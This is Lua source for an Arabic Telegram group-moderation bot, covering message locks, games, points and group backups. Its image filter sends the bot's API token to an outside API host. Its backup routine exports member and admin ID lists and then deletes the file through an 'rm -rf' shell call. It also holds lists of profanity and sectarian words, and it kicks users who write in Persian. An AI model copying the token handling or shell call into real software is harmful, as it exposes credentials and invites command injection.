if DevAIAN:get(WAAD..'AIAN:Lock:Text'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.text_:match("@") then
if DevAIAN:get(WAAD..'AIAN:Lock:Tags'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_:match("#") then
if DevAIAN:get(WAAD..'AIAN:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or text:match(".[Xx][Yy][Zz]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAIAN:get(WAAD..'AIAN:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_:match("[\216-\219][\128-\191]") then
if DevAIAN:get(WAAD..'AIAN:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_ then
local _nl, ctrl_chars = string.gsub(text, '%c', '')
local _nl, real_digits = string.gsub(text, '%d', '')
if not DevAIAN:get(WAAD..'AIAN:Spam:Text'..msg.chat_id_) then
sens = 400
else
sens = tonumber(DevAIAN:get(WAAD..'AIAN:Spam:Text'..msg.chat_id_))
end
if DevAIAN:get(WAAD..'AIAN:Lock:Spam'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_:match("[A-Z]") or msg.content_.text_:match("[a-z]") then
if DevAIAN:get(WAAD..'AIAN:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
--     Source WAAD     --
if (msg.content_.sticker_)  and msg.reply_to_message_id_ == 0 and DevAIAN:get(WAAD.."AIAN:AIAN:Lock:Xn"..msg.chat_id_)=="del" then
sticker_id = msg.content_.sticker_.sticker_.persistent_id_
st = https.request('https://boyka-api.ml/ImageInfo.php?token='..TokenBot..'&url='..sticker_id.."&type=sticker")
eker = JSON.decode(st)
if eker.ok.Info == "Indecent" then
local list = DevAIAN:smembers(WAAD.."AIAN:BasicConstructor:"..msg.chat_id_)
t = "⌯︙المنشئين الاساسين تعالو مخرب \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
for k,v in pairs(list) do
local username = DevAIAN:get(WAAD.."Save:UserName" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "⌯︙ماكو منششئين يشوفولك جاره"
end
ReplyStatus(msg,msg.sender_user_id_,"Reply","⌯︙قام بنشر ملصق اباحيه\n"..t)  
DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.id_),msg.id_})   
end   
end
if (msg.content_.photo_) and msg.reply_to_message_id_ == 0 and DevAIAN:get(WAAD.."AIAN:AIAN:Lock:Xn"..msg.chat_id_)=="del" then
photo_id = msg.content_.photo_.sizes_[1].photo_.persistent_id_  
Srrt = https.request('https://boyka-api.ml/ImageInfo.php?token='..TokenBot..'&url='..photo_id.."&type=photo")
Sto = JSON.decode(Srrt)
if Sto.ok.Info == "Indecent" then
local list = DevAIAN:smembers(WAAD.."AIAN:BasicConstructor:"..msg.chat_id_)
t = "⌯︙  المنشئين الاساسين تعالو مخرب \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
for k,v in pairs(list) do
local username = DevAIAN:get(WAAD.."Save:UserName" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "⌯︙ماكو منششئين يشوفولك جاره"
end
ReplyStatus(msg,msg.sender_user_id_,"Reply","⌯︙ قام بنشر صوره اباحيه\n"..t)  
DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.id_),msg.id_})   
end   
end
--     Source WAAD     --
if DevAIAN:get(WAAD.."AIAN:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) then
if text == "الغاء" then
send(msg.chat_id_,msg.id_,"⌯︙تم الغاء حفظ الرابط")       
DevAIAN:del(WAAD.."AIAN:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) 
return false
end
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local Link = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
DevAIAN:set(WAAD.."AIAN:Groups:Links"..msg.chat_id_,Link)
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم حفظ الرابط بنجاح', 1, 'md')
DevAIAN:del(WAAD.."AIAN:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) 
return false 
end
end
--     Source WAAD     --
local msg = data.message_
text = msg.content_.text_
if text and Constructor(msg) then 
if DevAIAN:get('WAAD:'..WAAD.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevAIAN:del('WAAD:'..WAAD..'id:user'..msg.chat_id_)  
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم الغاء الامر', 1, 'md')
DevAIAN:del('WAAD:'..WAAD.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevAIAN:del('WAAD:'..WAAD.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevAIAN:get('WAAD:'..WAAD..'id:user'..msg.chat_id_)  
DevAIAN:incrby(WAAD..'AIAN:UsersMsgs'..msg.chat_id_..':'..iduserr,numadded)
Dev_AIAN(msg.chat_id_, msg.id_,  1, "⌯︙تم اضافة "..numadded..' رساله', 1, 'md')
DevAIAN:del('WAAD:'..WAAD..'id:user'..msg.chat_id_) 
end
end
if text and Constructor(msg) then 
if DevAIAN:get('WAAD:'..WAAD.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevAIAN:del('WAAD:'..WAAD..'ids:user'..msg.chat_id_)  
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم الغاء الامر', 1, 'md')
DevAIAN:del('WAAD:'..WAAD.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevAIAN:del('WAAD:'..WAAD.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevAIAN:get('WAAD:'..WAAD..'ids:user'..msg.chat_id_)  
DevAIAN:incrby(WAAD..'AIAN:GamesNumber'..msg.chat_id_..iduserr,numadded)  
Dev_AIAN(msg.chat_id_, msg.id_,  1, "⌯︙تم اضافة "..numadded..' نقطه', 1, 'md')
DevAIAN:del('WAAD:'..WAAD..'ids:user'..msg.chat_id_)  
end
end
--     Source WAAD     --
if text and (text:match("طيز") or text:match("ديس") or text:match("انيج") or text:match("نيج") or text:match("ديوس") or text:match("عير") or text:match("كسختك") or text:match("كسمك") or text:match("كسربك") or text:match("بلاع") or text:match("ابو العيوره") or text:match("منيوج") or text:match("كحبه") or text:match("كحاب") or text:match("الكحبه") or text:match("كسك") or text:match("طيزك") or text:match("كس امك") or text:match("صرم") or text:match("كس اختك")) then
if not DevAIAN:get(WAAD.."AIAN:Lock:Fshar"..msg.chat_id_) and not BasicConstructor(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌯︙ممنوع الفشار في المجموعه \n⌯︙تأدب شوية عيب\n✓")  
end end
if text and (text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") or text:match("راحتی") or text:match("خسته") or text:match("بیام") or text:match("بپوشم") or text:match("كرمه")) then
if DevAIAN:get(WAAD.."AIAN:Lock:Farsi"..msg.chat_id_) and not Admin(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌯︙ممنوع التكلم بالغه الفارسيه هنا\n⌯︙لتصير ذيل\n✓")  
end end
if text and (text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") or text:match("راحتی") or text:match("خسته") or text:match("بیام") or text:match("بپوشم") or text:match("كرمه")) then
if DevAIAN:get(WAAD.."AIAN:Lock:FarsiBan"..msg.chat_id_) and not Admin(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ChatKick(msg.chat_id_, msg.sender_user_id_)
end end 
if text and (text:match("خره بالله") or text:match("خبربك") or text:match("كسدينربك") or text:match("خرب بالله") or text:match("خرب الله") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") or text:match("خربالله")) then
if not DevAIAN:get(WAAD.."AIAN:Lock:Kfr"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌯︙ممنوع الكفران في المجموعه\n⌯︙استغفر ربك\n✓") 
end end
if text and (text:match("سني نكس") or text:match("شيعه") or text:match("الشيعه") or text:match("السنه") or text:match("طائفتكم") or text:match("شيعي") or text:match("انا سني") or text:match("مسيحي") or text:match("يهودي") or text:match("صابئي") or text:match("ملحد") or text:match("بالسنه") or text:match("شيعة")) then
if not DevAIAN:get(WAAD.."AIAN:Lock:Taf"..msg.chat_id_) and not BasicConstructor(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌯︙ممنوع التكلم بالطائفيه هنا\n⌯︙اخوان سنة وشيعة ❤️\n✓") 
end end
--     Source WAAD     --
if SecondSudo(msg) then
if text == 'جلب نسخه الكروبات' or text == 'جلب نسخه احتياطيه' or text == 'جلب النسخه الاحتياطيه' or text == '↫ جلب نسخه احتياطيه ⌯' and ChCheck(msg) then
local List = DevAIAN:smembers(WAAD..'AIAN:Groups') 
local Members = DevAIAN:smembers(WAAD..'AIAN:Users') 
local BotName = (DevAIAN:get(WAAD.."AIAN:NameBot") or 'دراكون')
local GetJson = '{"BotId": '..WAAD..',"BotName": "'..BotName..'","GroupsList":{'  
for k,v in pairs(List) do 
LinkGroups = DevAIAN:get(WAAD.."AIAN:Groups:Links"..v)
Welcomes = DevAIAN:get(WAAD..'AIAN:Groups:Welcomes'..v) or ''
Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
AIANConstructors = DevAIAN:smembers(WAAD..'AIAN:AIANConstructor:'..v)
Constructors = DevAIAN:smembers(WAAD..'AIAN:BasicConstructor:'..v)
BasicConstructors = DevAIAN:smembers(WAAD..'AIAN:Constructor:'..v)
Managers = DevAIAN:smembers(WAAD..'AIAN:Managers:'..v)
Admis = DevAIAN:smembers(WAAD..'AIAN:Admins:'..v)
Vips = DevAIAN:smembers(WAAD..'AIAN:VipMem:'..v)
if k == 1 then
GetJson = GetJson..'"'..v..'":{'
else
GetJson = GetJson..',"'..v..'":{'
end
if #Vips ~= 0 then 
GetJson = GetJson..'"Vips":['
for k,v in pairs(Vips) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Admis ~= 0 then
GetJson = GetJson..'"Admis":['
for k,v in pairs(Admis) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Managers ~= 0 then
GetJson = GetJson..'"Managers":['
for k,v in pairs(Managers) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Constructors ~= 0 then
GetJson = GetJson..'"Constructors":['
for k,v in pairs(Constructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #BasicConstructors ~= 0 then
GetJson = GetJson..'"BasicConstructors":['
for k,v in pairs(BasicConstructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #AIANConstructors ~= 0 then
GetJson = GetJson..'"AIANConstructors":['
for k,v in pairs(AIANConstructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if LinkGroups then
GetJson = GetJson..'"LinkGroups":"'..LinkGroups..'",'
end
GetJson = GetJson..'"Welcomes":"'..Welcomes..'"}'
end
if #Members ~= 0 then 
GetJson = GetJson..'"mem":['
for k,v in pairs(Members) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
GetJson = GetJson..'}}'
local File = io.open('./'..WAAD..'.json', "w")
File:write(GetJson)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..WAAD..'.json', '⌯︙يحتوي الملف  \n    • على ↫ '..#List..' مجموعه\n    • وايضاَ ↫ '..#Members..' مشتركين\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ',dl_cb, nil)
io.popen('rm -rf ./'..WAAD..'.json')
end
if text and (text == '+-رفع النسخه' or text == '+-رفع النسخه الاحتياطيه' or text == '+-رفع نسخه الاحتياطيه') and tonumber(msg.reply_to_message_id_) > 0 then   
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
AddFile(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
--     Source WAAD     --
if DevAIAN:get(WAAD.."SET:GAME"..msg.chat_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
Dev_AIAN( msg.chat_id_, msg.id_, 1,"⌯︙يوجد فقط ( 6 ) اختيارات\n⌯︙ارسل اختيارك مره اخرى", 1, "md")    
return false  end 
local GETNUM = DevAIAN:get(WAAD.."GAMES"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevAIAN:del(WAAD.."SET:GAME"..msg.chat_id_)   
Dev_AIAN( msg.chat_id_, msg.id_, 1,'⌯︙*المحيبس باليد رقم* ↫ '..NUM..'\n⌯︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, "md") 
DevAIAN:incrby(WAAD..'AIAN:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevAIAN:del(WAAD.."SET:GAME"..msg.chat_id_)   
Dev_AIAN( msg.chat_id_, msg.id_, 1,'⌯︙*المحيبس باليد رقم* ↫ '..GETNUM..'\n⌯︙*للاسف لقد خسرت حاول مره اخرى للعثور على المحيبس*', 1, "md")
end
end
end
if DevAIAN:get(WAAD..'DevAIAN4'..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, "⌯︙تم الغاء الامر")
DevAIAN:del(WAAD..'DevAIAN4'..msg.sender_user_id_)
return false  end 
DevAIAN:del(WAAD..'DevAIAN4'..msg.sender_user_id_)
local username = string.match(text, "@[%a%d_]+") 
tdcli_function({ID = "SearchPublicChat",username_ = username},function(arg,data) 
if data and data.message_ and data.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_, '⌯︙المعرف لا يوجد فيه قناة')
return false  end
if data and data.type_ and data.type_.ID and data.type_.ID == 'PrivateChatInfo' then
send(msg.chat_id_, msg.id_, '⌯︙عذرا لا يمكنك وضع معرف حسابات في الاشتراك')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_, '⌯︙عذرا لا يمكنك وضع معرف مجموعه في الاشتراك')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == false then
if data and data.type_ and data.type_.channel_ and data.type_.channel_.ID and data.type_.channel_.status_.ID == 'ChatMemberStatusEditor' then
send(msg.chat_id_, msg.id_,'⌯︙البوت ادمن في القناة \n⌯︙تم تفعيل الاشتراك الاجباري \n⌯︙ايدي القناة ↫ '..data.id_..'\n⌯︙معرف القناة ↫ [@'..data.type_.channel_.username_..']')
DevAIAN:set(WAAD..'AIAN:ChId',data.id_)
else
send(msg.chat_id_, msg.id_,'⌯︙عذرا البوت ليس ادمن في القناة')
end
return false  
end
end,nil)
end
--     Source WAAD     --
if DevAIAN:get(WAAD.."AIAN:DevText"..msg.chat_id_..":" .. msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
DevAIAN:del(WAAD.."AIAN:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم الغاء الامر', 1, 'md')
return false 
end 
DevAIAN:del(WAAD.."AIAN:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
local DevText = msg.content_.text_:match("(.*)")
DevAIAN:set(WAAD.."DevText", DevText)
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم حفظ كليشة المطور", 1, "md")
end
if DevAIAN:get(WAAD..'AIAN:NameBot'..msg.sender_user_id_) == 'msg' then
if text and text:match("^الغاء$") then 
DevAIAN:del(WAAD..'AIAN:NameBot'..msg.sender_user_id_)
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم الغاء الامر', 1, 'md')
return false 
end 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم حفظ اسم البوت ', 1, 'html')
DevAIAN:del(WAAD..'AIAN:NameBot'..msg.sender_user_id_)
DevAIAN:set(WAAD..'AIAN:NameBot', text)
return false 
end
--     Source WAAD     --
if text == "الرابط" then 
if not DevAIAN:get(WAAD.."AIAN:Lock:GpLinks"..msg.chat_id_) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙جلب رابط المجموعه معطل', 1, 'md') 
return false  
end
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
local link = DevAIAN:get(WAAD.."AIAN:Groups:Links"..msg.chat_id_)            
if link then  
local textLink = '⌯︙🌐 Group Link ↬ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n• ['..ta.title_..']('..link..')'  
local inline = {{{text = '• '..ta.title_..' •',url=''..link}},}
msg_id =  msg.id_/2097152/0.5
SendInline(msg.chat_id_,textLink,nil,inline,msg_id) 
else                
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
linkgp = '⌯︙🌐 Group Link ↬ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n• ['..ta.title_..']('..linkgpp.result..')'
local inline = {{{text = '• '..ta.title_..' •',url=''..linkgpp.result}},}
msg_id =  msg.id_/2097152/0.5
SendInline(msg.chat_id_,linkgp,nil,inline,msg_id) 
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙لايوجد رابط ارسل ↫ ضع رابط او ارسل ↫ انشاء رابط للانشاء', 1, 'md')
end  
end      
end,nil)
end
--     Source WAAD     --
if ChatType == 'sp' or ChatType == 'gp'  then
if text == 'بوت' or text == 'بوتت' then 
local WAAD = {"❤️‍🔥","🏌🏼","🦋","🍧","🥲","🍇","🥲♥️","♥️","🍧🍇",""} 
local WAAD = WAAD[math.random(#WAAD)]
NameBot = (DevAIAN:get(WAAD..'AIAN:NameBot') or 'دراكون')
local WAAD = {
    "لتڪول بۅٛت اسَميہ "..NameBot.." "..WAAD.."",
    "اسميہ ألقمـيل "..NameBot.." "..WAAD.."",
    "• عنديہ آسم ترۿ "..WAAD.."",
    "صـيحوليہ "..NameBot.." ڪـآآفي بۅٛت "..WAAD.."",
    "أنتهہ ألبۅٛت ݪڪك "..WAAD.."",
    "شتࢪيَد ضَݪـ؏ـييہ "..WAAD.."",
    "ههآآه يـڕﯢحٰ "..NameBot.." "..WAAD.."",
} 
DevAIAN2 = math.random(#WAAD) 
Dev_AIAN(msg.chat_id_, msg.id_, 1, WAAD[DevAIAN2] , 1, 'html') 
return false
end
if text == 'اسم البوت' or text == 'البوت شنو اسمه' or text == 'شسمه البوت' or text == 'البوت شسمه' then
local WAAD = {"❤️‍🔥","🏌🏼","🦋","🍧","🥲","🍇","🥲♥️","♥️","🍧🍇",""} 
local WAAD = WAAD[math.random(#WAAD)]
NameBot = (DevAIAN:get(WAAD..'AIAN:NameBot') or 'دراكون') 
local WAAD = {
    "آسميہ ألقمـيل "..NameBot.." "..WAAD.."",
    'ڪول - حبيبي اﻧـييہ '..NameBot..' '..WAAD..'',
    "هلآآ ؏ـمـريـہٰ. وياڪك "..NameBot.." "..WAAD..""
} 
DevAIAN2 = math.random(#WAAD) 
Dev_AIAN(msg.chat_id_, msg.id_, 1, WAAD[DevAIAN2] , 1, 'html') 
return false
end
if text and text == (DevAIAN:get(WAAD..'AIAN:NameBot') or 'دراكون') then 
local WAAD = {"❤️‍🔥","🏌🏼","🦋","🍧","🥲","🍇","🥲♥️","♥️","🍧🍇",""} 
local WAAD = WAAD[math.random(#WAAD)]
NameBot = (DevAIAN:get(WAAD..'AIAN:NameBot') or 'دراكون')
local namebot = {
    'هلآآ ڪـلبي وياڪك '..NameBot..' تفضـࢦ'..WAAD..'',
    'تࢪۿ مَصختَها آحچيَ شتࢪيد '..WAAD..'',
    'اطݪق وآحَد يصـيح '..NameBot..' '..WAAD..'',
    'شسالفهہ ڪافي 🥲',
    'خبصتَ آمڼهہ شتࢪيَد عاآد '..WAAD..''
} 
name = math.random(#namebot) 
Dev_AIAN(msg.chat_id_, msg.id_, 1, namebot[name] , 1, 'html') 
return false 
end
if text =='نقاطي' and ChCheck(msg) then 
if tonumber((DevAIAN:get(WAAD..'AIAN:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙لم تربح اي نقطه\n⌯︙ارسل ↫ الالعاب للعب', 1, 'md')
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙عدد النقاط التي ربحتها ↫ '..(DevAIAN:get(WAAD..'AIAN:GamesNumber'..msg.chat_id_..msg.sender_user_id_)), 1, 'md')
end
end
if text ==  'حذف رسائلي' and ChCheck(msg) or text ==  'مسح رسائلي' and ChCheck(msg) then DevAIAN:del(WAAD..'AIAN:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_) Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم حذف جميع رسائلك', 1, 'md') end
if text ==  'حذف نقاطي' and ChCheck(msg) or text ==  'مسح نقاطي' and ChCheck(msg) then DevAIAN:del(WAAD..'AIAN:GamesNumber'..msg.chat_id_..msg.sender_user_id_) Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم حذف جميع نقاطك', 1, 'md') end
--     Source WAAD     --
if text == 'جهاته' and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then 
function ContactNumber_by_reply(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local Add_Mem = DevAIAN:get(WAAD.."AIAN:ContactNumber"..msg.chat_id_..":"..data.id_) or 0
if Add_Mem == 0 then 
Text = "⌯︙ هو لم يقم باضافه اي جهات الئ المجموعة هذا"
else
Text = "⌯︙ عدد الجهات التي قام باضافتها هي *~ ( "..Add_Mem.." ) ~ جهات *"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1,Text, 1, 'md') 
end,nil)   
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, ContactNumber_by_reply, nil)
return false
end
if text == 'رسائله' and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then 
function NumMsg_by_reply(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local NumMsg = DevAIAN:get(WAAD..'AIAN:UsersMsgs'..msg.chat_id_..':'..data.id_) or 0
if NumMsg == 0 then 
Text = "⌯︙ هذا الشخص لم يقم بارسال ولا حتئ رسأله واحده"
else
Text = "⌯︙ عدد الرسائل التي قام بارسألها هنا *~ ❨ "..NumMsg.." ❩ ~ رساله *"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1,Text, 1, 'md')
end,nil)   
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, NumMsg_by_reply, nil)
return false
end
if text == 'سحكاته' and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then 
function EditMsg_by_reply(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local EditMsg = DevAIAN:get(WAAD..'AIAN:EditMsg'..msg.chat_id_..data.id_) or 0
if EditMsg == 0 then 
Text = "⌯︙ العب غيرها حبيبي هذا سيبويه باللغة العربيه"
else
Text = "⌯︙ عدد السحكات للمصرين الي سحكهم *~ ❨ "..EditMsg.." ❩ ~ سحكه *"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1,Text, 1, 'md') 
end,nil)   
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, EditMsg_by_reply, nil)
return false
end
if text == 'نقاطه' and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then 
function GamesNumber_by_reply(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local Num = tonumber(DevAIAN:get(WAAD..'AIAN:GamesNumber'..msg.chat_id_..data.id_) or 0)
if Num == 0 then 
Text = "⌯︙ هو لم يلعب اي لعبه للحصول على النقاط"
else
Text = "⌯︙ عدد النقاط التي ربحها هي *~ ( "..Num.." ) ~ نقطه *"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1,Text, 1, 'md') 
end,nil)   
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, GamesNumber_by_reply, nil)
return false
end
--     Source WAAD     --
if text == 'سمايلات' and ChCheck(msg) or text == 'السمايلات' and ChCheck(msg) then
if not DevAIAN:get(WAAD..'AIAN:Lock:Games'..msg.chat_id_) then
DevAIAN2 = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🏆','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🛎','📤','🎗','🏵','🎖','🏆','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔️','🛡','🔮','🌡','💣','⏱','🛢','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
name = DevAIAN2[math.random(#DevAIAN2)]
DevAIAN:set(WAAD..'AIAN:GameNum'..msg.chat_id_,name)
DevAIAN:del(WAAD..'AIAN:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'🍞','🍞')
name = string.gsub(name,'🥖','🥖')
name = string.gsub(name,'🥨','🥨')
name = string.gsub(name,'🧀','🧀')
name = string.gsub(name,'🥚','🥚')
name = string.gsub(name,'🍳','🍳')
name = string.gsub(name,'🥞','🥞')
